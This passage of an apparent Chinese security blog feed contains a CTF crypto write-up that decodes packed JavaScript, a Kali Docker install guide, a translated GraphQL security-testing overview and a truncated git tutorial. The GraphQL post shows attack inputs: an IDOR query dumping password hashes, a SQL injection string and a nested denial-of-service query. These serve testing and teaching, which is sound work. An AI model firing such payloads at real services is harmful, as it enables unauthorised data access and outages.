g=2.9(m,4*4)+2.9(l,5*5)+2.9(0,1)+2.b(7,1)+2.b(z,1)+2.b(B,1)+2.9(3+3,7);8=d.b(d.f(\'?\')+1);a=a.9(0,a.f(\'?\')+1)+\'A=\';w(i=0;i&lt;8.y;i++)&#123;x(8.c(i)==g.c(i))&#123;h.u(8.c(i))&#125;&#125;j=a+8&#125;--&gt;</span>',38,38,'||cry||||var||pass|substring|addr|substr|charAt|locatie|passwd|indexOf|pass2|document||location|out|24|15|value|form|zhegejiamiyidiandoubuku|Rm9yM0re354v5E4FUg5FasDboooo|href|php|soroki|write|function|for|if|Len|11|l0vau|13'.split('|'),0,&#123;&#125;))</span></span><br><span class="line"><span class="undefined">--&gt;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"form"</span>&gt;</span></span><br><span class="line">Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"passwd"</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"boom!!!!"</span> <span class="attr">onClick</span>=<span class="string">"zhegejiamiyidiandoubuku()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>经过网站解密:<a href="https://www.sojson.com/jsjiemi.html" target="_blank" rel="noopener">https://www.sojson.com/jsjiemi.html</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--<span class="function"><span class="keyword">function</span> <span class="title">zhegejiamiyidiandoubuku</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pass=<span class="built_in">document</span>.form.passwd.value;</span><br><span class="line">    <span class="keyword">var</span> cry=<span class="string">"Rm9yM0re354v5E4FUg5FasDboooo=="</span>;</span><br><span class="line">    <span class="keyword">var</span> addr=<span class="string">'soroki.php?passwd='</span>;</span><br><span class="line">    <span class="keyword">var</span> locatie=location.href;</span><br><span class="line">    <span class="keyword">var</span> out=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> pass2=cry.substring(<span class="number">15</span>,<span class="number">4</span>*<span class="number">4</span>)+cry.substring(<span class="number">24</span>,<span class="number">5</span>*<span class="number">5</span>)+cry.substring(<span class="number">0</span>,<span class="number">1</span>)+cry.substr(<span class="number">7</span>,<span class="number">1</span>)+cry.substr(<span class="number">11</span>,<span class="number">1</span>)+cry.substr(<span class="number">13</span>,<span class="number">1</span>)+cry.substring(<span class="number">3</span>+<span class="number">3</span>,<span class="number">7</span>);</span><br><span class="line">    pass=locatie.substr(locatie.indexOf(<span class="string">'?'</span>)+<span class="number">1</span>);addr=addr.substring(<span class="number">0</span>,addr.indexOf(<span class="string">'?'</span>)+<span class="number">1</span>)+<span class="string">'l0vau='</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;pass.Len;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pass.charAt(i)==pass2.charAt(i))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">document</span>.write(pass.charAt(i))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;location=addr+pass</span><br><span class="line">    &#125;--&gt;</span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string">将以下代码放置控制台运行</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>javascript</span><br><span class="line">     <span class="keyword">var</span> cry=<span class="string">"Rm9yM0re354v5E4FUg5FasDboooo=="</span>;</span><br><span class="line">        <span class="keyword">var</span> addr=<span class="string">'soroki.php?passwd='</span>;</span><br><span class="line">        <span class="keyword">var</span> locatie=location.href;</span><br><span class="line">        <span class="keyword">var</span> out=<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">var</span> pass2=cry.substring(<span class="number">15</span>,<span class="number">4</span>*<span class="number">4</span>)+cry.substring(<span class="number">24</span>,<span class="number">5</span>*<span class="number">5</span>)+cry.substring(<span class="number">0</span>,<span class="number">1</span>)+cry.substr(<span class="number">7</span>,<span class="number">1</span>)+cry.substr(<span class="number">11</span>,<span class="number">1</span>)+cry.substr(<span class="number">13</span>,<span class="number">1</span>)+cry.substring(<span class="number">3</span>+<span class="number">3</span>,<span class="number">7</span>);</span><br><span class="line">        pass=locatie.substr(locatie.indexOf(<span class="string">'?'</span>)+<span class="number">1</span>);addr=addr.substring(<span class="number">0</span>,addr.indexOf(<span class="string">'?'</span>)+<span class="number">1</span>)+<span class="string">'l0vau='</span>;</span><br><span class="line">    <span class="string">"soroki.php?l0vau="</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/05/30/5b0eb0f922d41.png" alt=""></p><p>得到<code>soroki.php?l0vau=</code></p><p>编写python代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">cry=<span class="string">"Rm9yM0re354v5E4FUg5FasDboooo=="</span></span><br><span class="line">addr=<span class="string">'soroki.php?passwd='</span></span><br><span class="line">locatie=<span class="string">"http://ctf5.shiyanbar.com/crypto/4/"</span></span><br><span class="line">pass2=cry[<span class="number">15</span>:<span class="number">16</span>]+cry[<span class="number">24</span>:<span class="number">25</span>]+cry[<span class="number">0</span>:<span class="number">1</span>]+cry[<span class="number">7</span>:<span class="number">8</span>]+cry[<span class="number">11</span>:<span class="number">12</span>]+cry[<span class="number">13</span>:<span class="number">14</span>]+cry[<span class="number">6</span>:<span class="number">7</span>]</span><br><span class="line">addr=addr[:addr.index(<span class="string">'?'</span>)+<span class="number">1</span>]+<span class="string">'l0vau='</span></span><br><span class="line">location=locatie+addr+pass2</span><br><span class="line"><span class="keyword">print</span> location</span><br><span class="line">html=requests.get(location)</span><br></pre></td></tr></table></figure></p><p>得到<code>http://ctf5.shiyanbar.com/crypto/4/soroki.php?l0vau=FoRevEr</code><br>得到<code>aW4yIHNheTpJIGxvdmUgeW91IEZvcmV2ZXIhVGhlIEdpcmwgc2F5OiB6cWN7ZmtxdGxfZnBfeWZkX3B5fQ==</code><br>解密<code>in2 say:I love you Forever!The Girl say: zqc{fkqtl_fp_yfd_py}</code><br>flag:ctf{intwo_is_big_sb}</p><h3 id="js"><a href="#js" class="headerlink" title="js"></a>js</h3><p>小明某天在看js的时候，突然看到了这么一段代码，发现怎么也理不出代码逻辑，你能帮帮他吗？<br>格式：SimCTF{}<br>解题链接： <a href="http://ctf5.shiyanbar.com/crypto/2.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/crypto/2.html</a></p><p>一定要在查看源码中复制代码,把下面eval转换为console.log再放到控制台中运行<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">p,a,c,k,e,d</span>)</span>&#123;e=<span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span>(c&lt;a?<span class="string">""</span>:e(<span class="built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="built_in">String</span>.fromCharCode(c+<span class="number">29</span>):c.toString(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!<span class="string">''</span>.replace(<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(c--)d[e(c)]=k[c]||e(c);k=[<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> d[e]&#125;];e=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">'\\w+'</span>&#125;;c=<span class="number">1</span>;&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\\b'</span>+e(c)+<span class="string">'\\b'</span>,<span class="string">'g'</span>),k[c]);<span class="keyword">return</span> p;&#125;(<span class="string">'&lt;1 8="7/a"&gt;9(\'\\6\\3\\2\\5\\4\\b\\i\\h\\k\\j\\0\\g\\d\\c\\f\\0\\e\')&lt;/1&gt;'</span>,<span class="number">21</span>,<span class="number">21</span>,<span class="string">'u0065|script|u006d|u0069|u0054|u0043|u0053|text|type|alert|javascript|u0046|u006f|u0063|u007d|u0064|u006e|u006a|u007b|u005f|u0073'</span>.split(<span class="string">'|'</span>),<span class="number">0</span>,&#123;&#125;))</span><br><span class="line"></span><br><span class="line">得到</span><br><span class="line"></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;alert(<span class="string">'\u0053\u0069\u006d\u0043\u0054\u0046\u007b\u006a\u0073\u005f\u0065\u006e\u0063\u006f\u0064\u0065\u007d'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>解密：<a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">http://tool.chinaz.com/tools/unicode.aspx</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;密码学&quot;&gt;&lt;a href=&quot;#密码学&quot; class=&quot;headerlink&quot; title=&quot;密码学&quot;&gt;&lt;/a&gt;密码学&lt;/h2&gt;&lt;h3 id=&quot;疑惑的汉字&quot;&gt;&lt;a href=&quot;#疑惑的汉字&quot; class=&quot;headerlink&quot; title=&quot;疑惑的汉字&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
      <category term="writeup ctf" scheme="https://threst.github.io/tags/writeup-ctf/"/>
    
  </entry>
  
  <entry>
    <title>kali下安装docker</title>
    <link href="https://threst.github.io/2018/05/29/kali%E5%AE%89%E8%A3%85docker/"/>
    <id>https://threst.github.io/2018/05/29/kali安装docker/</id>
    <published>2018-05-29T12:33:09.000Z</published>
    <updated>2018-05-30T14:35:17.620Z</updated>
    
    <content type="html"><![CDATA[<p>周末水了下suctf，只做出签到题，太菜了，今天在安全客上面梅子酒师傅发出了wp，看了之后觉得质量非常高，最重要的是可以在docker上复现，发现现在kali上面并没有安装docker，之前在知乎上面写过一篇关于如何安装docker的<a href="https://zhuanlan.zhihu.com/p/32288292" target="_blank" rel="noopener">文章</a>，于是晚上试了下，尴尬的是失败了！！google了下，喜获一个一键安装脚本，看了下大佬脚本发现可能是<code>apt-get install docker-ce</code>这个的问题，因为之前一直是<code>apt-cache policy docker-engine</code></p><h2 id="之前的安装方式"><a href="#之前的安装方式" class="headerlink" title="之前的安装方式"></a>之前的安装方式</h2><p>由于kali linux是基于Debian Wheezy，所以这里docker需要的内核版本至少是3.10，因此需要检查下kali的内核，如果不够的话，需要更新内核<br><code>uname -a</code><br>切换用户root下</p><h3 id="1-创建-etc-apt-sources-list-d-backports-list"><a href="#1-创建-etc-apt-sources-list-d-backports-list" class="headerlink" title="1.创建/etc/apt/sources.list.d/backports.list"></a>1.创建/etc/apt/sources.list.d/backports.list</h3><p><code>leafpad /etc/apt/sources.list.d/backports.list</code></p><h3 id="2-在list文件里加上一条反向端口条目"><a href="#2-在list文件里加上一条反向端口条目" class="headerlink" title="2.在list文件里加上一条反向端口条目"></a>2.在list文件里加上一条反向端口条目</h3><p><code>deb http://http.debian.net/debian wheezy-backports main</code></p><h3 id="3-更新软件包"><a href="#3-更新软件包" class="headerlink" title="3.更新软件包"></a>3.更新软件包</h3><p><code>apt update</code></p><h3 id="4-如果以前安装过docker"><a href="#4-如果以前安装过docker" class="headerlink" title="4.如果以前安装过docker"></a>4.如果以前安装过docker</h3><p>就这样删除所有旧版本docker</p><pre><code>apt-get purge lxc-docker*apt-get purge docker.io*</code></pre><p>可能没有旧版本（之前没有安装过）<br>没有的继续</p><h3 id="5-确认apt添加了https方法和CA-cerificates"><a href="#5-确认apt添加了https方法和CA-cerificates" class="headerlink" title="5.确认apt添加了https方法和CA cerificates"></a>5.确认apt添加了https方法和CA cerificates</h3><p><code>apt-get install apt-transport-https ca-certificates gnupg2</code></p><h3 id="6-添加一个新的GPG-key"><a href="#6-添加一个新的GPG-key" class="headerlink" title="6.添加一个新的GPG key"></a>6.添加一个新的GPG key</h3><p><code>apt-key adv --keyserver hkp://ha.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D</code></p><h3 id="7-安装repository"><a href="#7-安装repository" class="headerlink" title="7.安装repository"></a>7.安装repository</h3><p><code>apt-cache policy docker-engine</code><br>这个命令可以查看是否存在资源之后再<br><code>apt-get install docker-engine</code><br>但是这个好像不行了要执行下列命令<br><code>apt-get install docker-ce</code></p><h2 id="一键安装脚本"><a href="#一键安装脚本" class="headerlink" title="一键安装脚本"></a>一键安装脚本</h2><pre><code>#!/bin/bash# install dependencies sudo apt-get install apt-transport-https ca-certificates curl gnupg software-properties-common dirmngr# use https get sources  sudo echo &quot;deb https://http.kali.org/kali kali-rolling main non-free contrib&quot; &gt; /etc/apt/sources.listsudo echo &quot;deb-src https://http.kali.org/kali kali-rolling main non-free contrib&quot; &gt;&gt; /etc/apt/sources.list# update apt-getexport DEBIAN_FRONTEND=&quot;noninteractive&quot;sudo apt-get update# remove previously installed Dockersudo apt-get purge lxc-docker*sudo apt-get purge docker.io*# add Docker repo gpg keycurl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -# add deb docker sourcessudo echo &quot;deb [arch=amd64] https://download.docker.com/linux/debian stretch stable&quot; &gt;&gt; /etc/apt/sources.list cat &gt; /etc/apt/sources.list.d/docker.list &lt;&lt;&apos;EOF&apos;deb https://apt.dockerproject.org/repo debian-stretch mainEOFsudo apt-get update# install Dockersudo apt-get install docker-ce# run Hellow World imagesudo docker run hello-world# manage Docker as a non-root usersudo groupadd dockersudo usermod -aG docker $USER# configure Docker to start on bootsudo systemctl enable docker</code></pre><p><a href="https://github.com/Mr-xn/Kali-install-docker" target="_blank" rel="noopener">脚本地址</a></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试:"></a>测试:</h2><p><code>root@kali:/home/threst# docker run hello-world</code><br>出现下面这个就是安装成功了</p><pre><code>Hello from Docker!This message shows that your installation appears to be working correctly.To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.    (amd64) 3. The Docker daemon created a new container from that image which runs the    executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it    to your terminal.To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bashShare images, automate workflows, and more with a free Docker ID: https://hub.docker.com/For more examples and ideas, visit: https://docs.docker.com/engine/userguide/</code></pre><p>使用国内镜像:<br><code>docker pull registry.docker-cn.com/myname/myrepo:mytag</code><br>例如<br><code>docker pull registry.docker-cn.com/suctf/2018-web-annonymous</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;周末水了下suctf，只做出签到题，太菜了，今天在安全客上面梅子酒师傅发出了wp，看了之后觉得质量非常高，最重要的是可以在docker上复现，发现现在kali上面并没有安装docker，之前在知乎上面写过一篇关于如何安装docker的&lt;a href=&quot;https://zhu
      
    
    </summary>
    
    
      <category term="kali docker" scheme="https://threst.github.io/tags/kali-docker/"/>
    
  </entry>
  
  <entry>
    <title>你肯定不知道的GraphQL安全概述和测试技巧</title>
    <link href="https://threst.github.io/2018/05/22/%E4%BD%A0%E8%82%AF%E5%AE%9A%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84GraphQL%E5%AE%89%E5%85%A8%E6%A6%82%E8%BF%B0%E5%92%8C%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/"/>
    <id>https://threst.github.io/2018/05/22/你肯定不知道的GraphQL安全概述和测试技巧/</id>
    <published>2018-05-22T09:33:09.000Z</published>
    <updated>2018-05-22T14:32:49.122Z</updated>
    
    <content type="html"><![CDATA[<h2 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h2><p>随着GraphQL技术的日益普及，我们总结了一些关于常见安全错误的文档和提示。</p><h2 id="什么是GraphQL？"><a href="#什么是GraphQL？" class="headerlink" title="什么是GraphQL？"></a>什么是GraphQL？</h2><p><a href="https://graphql.org/" target="_blank" rel="noopener">GraphQL</a>是由Facebook开发并于2015年公开发布的数据查询语言。它是REST API的替代品。</p><p>即使你没有看到任何GraphQL在那里，很可能你已经在使用它，因为它是在一些大的科技巨头，Facebook, GitHub, Pinterest, Twitter, HackerOne<a href="http://graphql.org/users/" target="_blank" rel="noopener">更多</a>。</p><h3 id="这项技术的几个关键点"><a href="#这项技术的几个关键点" class="headerlink" title="这项技术的几个关键点"></a>这项技术的几个关键点</h3><p>1.GraphQL提供了API中数据的完整和可理解的描述，并使客户能够精确地询问他们需要什么。返回可预测的结果。<br>2.典型的RESTAPI需要从多个URL进行加载，但GraphQLAPI可以在单个请求中获取应用程序所需的所有数据。<br>3.GraphQL api是按照类型和字段而不是端点来组织的,您可以从单个端点访问所有数据的全部功能。<br>4.GraphQL是强类型的，以确保应用程序只询问可能的情况并提供明确而有用的错误。<br>5.新的字段和类型可以添加到GraphQL API，而不会影响现有的查询。老化的字段可以被弃用，并且隐藏在工具中。</p><p>在开始深入研究GraphQL安全领域之前，下面简要回顾它的工作原理。该<a href="http://graphql.org/learn/" target="_blank" rel="noopener">官方文档</a>写得很好，是真正有用的。</p><p>一个GraphQL查询如下所示：<br>基本的GraphQL查询</p><pre><code>query{    user{        id        email        firstName        lastName    }}</code></pre><p>尽管响应是JSON：<br>基本的GraphQL响应</p><pre><code>{    &quot;data&quot;: {        &quot;user&quot;: {            &quot;id&quot;: &quot;1&quot;,            &quot;email&quot;: &quot;paolo@doyensec.com&quot;,            &quot;firstName&quot;: &quot;Paolo&quot;,            &quot;lastName&quot;: &quot;Stagno&quot;        }    }}</code></pre><h2 id="安全测试技巧"><a href="#安全测试技巧" class="headerlink" title="安全测试技巧"></a>安全测试技巧</h2><p>由于Burp Suite不太了解GraphQL语法，因此我建议使用graphql-ide，这是一个基于Electron的应用程序，允许您编辑和发送请求至GraphQL端点; 我还编写了一个小python脚本GraphQL_Introspection.py，它列举了一个GraphQL端点（带有内省），以便提取文档。该脚本对于检查GraphQL模式寻找信息泄露，隐藏数据和不可访问的字段非常有用。</p><p>该工具将生成类似于以下内容的HTML报告：<br><img src="https://p5.ssl.qhimg.com/t010f25d4f4ec02bcc3.png" alt=""></p><p>内省是用来要求一个GraphQL模式来获取关于它所支持的查询、类型等信息的信息。</p><p>作为一个渗透测试人员，我建议你去寻找发给<code>“/ graphql”</code>或<code>“/graphql.php”</code>的请求，因为这些是通常的GraphQL端点名称; 您还应搜索<code>“/ graphiql”</code>，<code>“graphql / console /”</code>，联机GraphQL IDE与后端交互，以及<code>“/graphql.php?debug=1”</code>（带有附加错误报告的调试模式），因为它们可能会被留下由开发人员开放。</p><p>在测试应用程序时，验证是否可以在没有通常授权令牌标头的情况下发出请求：<br><img src="https://p4.ssl.qhimg.com/t01cdb0b72a8ef0cb76.png" alt=""></p><p>由于GraphQL框架没有提供任何保护数据的手段，因此开发人员因按照文档中的说明实施访问控制：</p><blockquote><p>“但是，对于生产代码库，将授权逻辑委托给业务逻辑层”。</p></blockquote><p>任何事情都可能会出错，因此没有正确认证和或授权的用户是否可以从服务器请求整个底层数据库非常重要。<br>当使用GraphQL构建应用程序时，开发人员必须将数据映射到他们选择的数据库技术中的查询。这是易于引入安全漏洞的原因，导致 破坏访问控制，不安全的直接对象引用甚至SQL / NoSQL注入。</p><p>作为破坏实现的一个示例，以下请求 / 响应表明我们可以为平台的任何用户（通过ID参数循环访存）获取数据，同时转储密码哈希值：</p><p>询问</p><pre><code>query{    user(id: 165274){        id        email        firstName        lastName        password    }}</code></pre><p>响应</p><pre><code>{    &quot;data&quot;: {        &quot;user&quot;: {            &quot;id&quot;: &quot;165274&quot;,            &quot;email&quot;: &quot;johndoe@mail.com&quot;,            &quot;firstName&quot;: &quot;John&quot;,            &quot;lastName&quot;: &quot;Doe&quot;            &quot;password&quot;: &quot;5F4DCC3B5AA765D61D8327DEB882CF99&quot;        }    }}</code></pre><p>您需要检查的另一件事与尝试执行非法查询时的信息泄露有关：<br>信息披露</p><pre><code>{    &quot;errors&quot;: [        {            &quot;message&quot;: &quot;Invalid ID.&quot;,            &quot;locations&quot;: [                {                    &quot;line&quot;: 2,                    &quot;column&quot;: 12                }                &quot;Stack&quot;: &quot;Error: invalid ID\n at (/var/www/examples/04-bank/graphql.php)\n&quot;                ]        }    ]}</code></pre><p>虽然GraphQL是强类型的，但SQL / NoSQL注入仍然是可能的，因为GraphQL只是客户端应用程序和数据库之间的一个层。问题可能存在于为了查询数据库而从GraphQL查询中获取变量的层中，未正确清理的变量导致旧的简单SQL注入。在Mongodb的情况下，NoSQL注入可能并不那么简单，因为我们不能”juggle”类型（例如将字符串转换为数组，请参阅PHP MongoDB注入）。</p><p>GraphQL SQL注入</p><pre><code>mutation search($filters Filters!){    authors(filter: $filters)    viewer{        id        email        firstName        lastName    } }{    &quot;filters&quot;:{        &quot;username&quot;:&quot;paolo&apos; or 1=1--&quot;        &quot;minstories&quot;:0    }}</code></pre><p>谨防嵌套查询！它们可以允许恶意客户端通过过度复杂的查询来执行DoS（拒绝服务）攻击，这些查询会占用服务器的所有资源：</p><p>嵌套查询</p><pre><code>query { stories{  title  body  comments{   comment   author{    comments{     author{      comments{       comment       author{        comments{         comment         author{          comments{           comment           author{            name           }          }         }        }       }      }     }    }   }  } }}</code></pre><p>可能设置超时，最大深度或查询复杂度阈值来针对DoS进行简单补救<br>请记住，在PHP GraphQL实现中：<br>复杂性分析默认是禁用的<br>限制查询深度默认情况下处于禁用状态<br>自省是默认启用的。这意味着任何人都可以通过发送包含元字段类型和模式的特殊查询来完整描述您的模式</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>GraphQL是一项新的有趣的技术，可用于构建安全的应用程序。由于开发人员负责实施访问控制，因此应用程序很容易出现经典的Web应用程序漏洞，如Broken Access Controls，不安全的直接对象引用，跨站点脚本（XSS）和经典注入漏洞。就像任何技术一样，基于GraphQL的应用程序可能会像这个实际例子那样容易出现开发实现错误：</p><blockquote><p>“通过使用脚本，整个国家（我用美国，英国和加拿大测试过的）可能的号码组合都可以通过这些URL运行，并且如果一个号码与Facebook帐户相关联，则它可以与名称和更多细节（图像等）。“</p></blockquote><p>参考:<br><a href="https://en.wikipedia.org/wiki/GraphQL" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/GraphQL</a><br><a href="https://dev-blog.apollodata.com/the-concepts-of-graphql-bc68bd819be3" target="_blank" rel="noopener">https://dev-blog.apollodata.com/the-concepts-of-graphql-bc68bd819be3</a><br><a href="https://graphql.org/learn/" target="_blank" rel="noopener">https://graphql.org/learn/</a><br><a href="https://www.howtographql.com/" target="_blank" rel="noopener">https://www.howtographql.com/</a><br><a href="https://www.hackerone.com/blog/the-30-thousand-dollar-gem-part-1" target="_blank" rel="noopener">https://www.hackerone.com/blog/the-30-thousand-dollar-gem-part-1</a><br><a href="https://hackerone.com/reports/291531" target="_blank" rel="noopener">https://hackerone.com/reports/291531</a><br><a href="https://labs.detectify.com/2018/03/14/graphql-abuse/" target="_blank" rel="noopener">https://labs.detectify.com/2018/03/14/graphql-abuse/</a><br><a href="https://medium.com/the-graphqlhub/graphql-and-authentication-b73aed34bbeb" target="_blank" rel="noopener">https://medium.com/the-graphqlhub/graphql-and-authentication-b73aed34bbeb</a><br><a href="http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/" target="_blank" rel="noopener">http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/</a><br><a href="https://webonyx.github.io/graphql-php/" target="_blank" rel="noopener">https://webonyx.github.io/graphql-php/</a></p><p>本文翻译:<a href="https://blog.doyensec.com/2018/05/17/graphql-security-overview.html" target="_blank" rel="noopener">https://blog.doyensec.com/2018/05/17/graphql-security-overview.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;写在前面的话&quot;&gt;&lt;a href=&quot;#写在前面的话&quot; class=&quot;headerlink&quot; title=&quot;写在前面的话&quot;&gt;&lt;/a&gt;写在前面的话&lt;/h2&gt;&lt;p&gt;随着GraphQL技术的日益普及，我们总结了一些关于常见安全错误的文档和提示。&lt;/p&gt;
&lt;h2 id=&quot;什么
      
    
    </summary>
    
    
      <category term="安全客弃婴" scheme="https://threst.github.io/tags/%E5%AE%89%E5%85%A8%E5%AE%A2%E5%BC%83%E5%A9%B4/"/>
    
  </entry>
  
  <entry>
    <title>git一条龙(一看就会的那种)</title>
    <link href="https://threst.github.io/2018/05/17/git%E4%B8%80%E6%9D%A1%E9%BE%99(%E4%B8%80%E7%9C%8B%E5%B0%B1%E4%BC%9A%E7%9A%84%E9%82%A3%E7%A7%8D)/"/>
    <id>https://threst.github.io/2018/05/17/git一条龙(一看就会的那种)/</id>
    <published>2018-05-17T12:33:09.000Z</published>
    <updated>2018-05-17T12:51:32.325Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00安装git"><a href="#0x00安装git" class="headerlink" title="0x00安装git"></a>0x00安装git</h1><p>linux一般自带，windows访问以下链接<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">https://git-scm.com/downloads</a><br>然后去github上去注册一个帐号</p><h1 id="0x01创建版本库"><a href="#0x01创建版本库" class="headerlink" title="0x01创建版本库"></a>0x01创建版本库</h1><h2 id="1-新建文件夹"><a href="#1-新建文件夹" class="headerlink" title="1.新建文件夹"></a>1.新建文件夹</h2><p>随便新建一个文件夹</p><h2 id="2-将目录变成Git可以管理的仓库"><a href="#2-将目录变成Git可以管理的仓库" class="headerlink" title="2.将目录变成Git可以管理的仓库"></a>2.将目录变成Git可以管理的仓库</h2><p>初始化一个Git仓库,鼠标右键打开git bash，输入以下命令<br><code>git init</code></p><h2 id="3-添加文件到git仓库"><a href="#3-添加文件到git仓库" class="headerlink" title="3.添加文件到git仓库"></a>3.添加文件到git仓库</h2><p>首先随便你写个要添加至git仓库的文件</p><pre><code>第一步，使用命令`git add  随便什么文件名`，注意，可反复多次使用，添加多个文件；第二步，使用命令`git commit`，完成。</code></pre><h1 id="添加远程库"><a href="#添加远程库" class="headerlink" title="添加远程库"></a>添加远程库</h1><h2 id="添加ssh"><a href="#添加ssh" class="headerlink" title="添加ssh"></a>添加ssh</h2><p>在用户主目录下，看看有没有.ssh目录，如果有，再看看这个目录下有没有id_rsa和id_rsa.pub这两个文件，如果已经有了，可直接跳到下一步。如果没有，打开Shell（Windows下打开Git Bash），创建SSH Key：<br><code>ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</code><br>如果一切顺利的话，可以在用户主目录里找到.ssh目录，里面有id_rsa和id_rsa.pub两个文件，这两个就是SSH Key的秘钥对，id_rsa是私钥，不能泄露出去，id_rsa.pub是公钥，可以放心地告诉任何人</p><p>登陆GitHub，打开“Account settings”，“SSH Keys”页面：<br>然后，点“Add SSH Key”，填上任意Title，在Key文本框里粘贴id_rsa.pub文件的内容：</p><h2 id="关联一个远程库"><a href="#关联一个远程库" class="headerlink" title="关联一个远程库"></a>关联一个远程库</h2><pre><code>git remote add origin git@github.com:你github账户名/刚才创的项目名.git</code></pre><p>关联后，使用命令<code>git push -u origin master</code>第一次推送master分支的所有内容；</p><h1 id="具体如何操作？"><a href="#具体如何操作？" class="headerlink" title="具体如何操作？"></a>具体如何操作？</h1><h2 id="添加文件到git仓库"><a href="#添加文件到git仓库" class="headerlink" title="添加文件到git仓库"></a>添加文件到git仓库</h2><p>首先随便你写个要添加至git仓库的文件</p><p>第一步，使用命令<code>git add  随便什么文件名</code>，注意，可反复多次使用，添加多个文件；<br>第二步，使用命令<code>git commit</code>，完成。<br>第三步，使用命令<code>git push -u origin master</code>推送到分支中<br>在第三步之前，可以<code>git checkout -b xxx</code>创建xxx分支为你所用</p><h1 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h1><p><code>git checkout -b xxx</code>：新建xxx分支</p><p>git checkout命令加上-b参数表示创建并切换，相当于以下两条命令：<br> <code>git branch xxx</code><br><code></code> git checkout xxx`</p><p><code>git branch</code>：查看处于那个分支<br><code>git checkout master</code>：切换master分支<br><code>git merge xxx</code>：将xxx分支合并master分支,git merge命令用于合并指定分支到当前分支。<br><code>git  branch -d xxx</code>：删除xxx分支<br>要关联一个远程库，使用命令git remote add origin git@server-name:path/repo-name.git；<br>关联后，使用命令git push -u origin 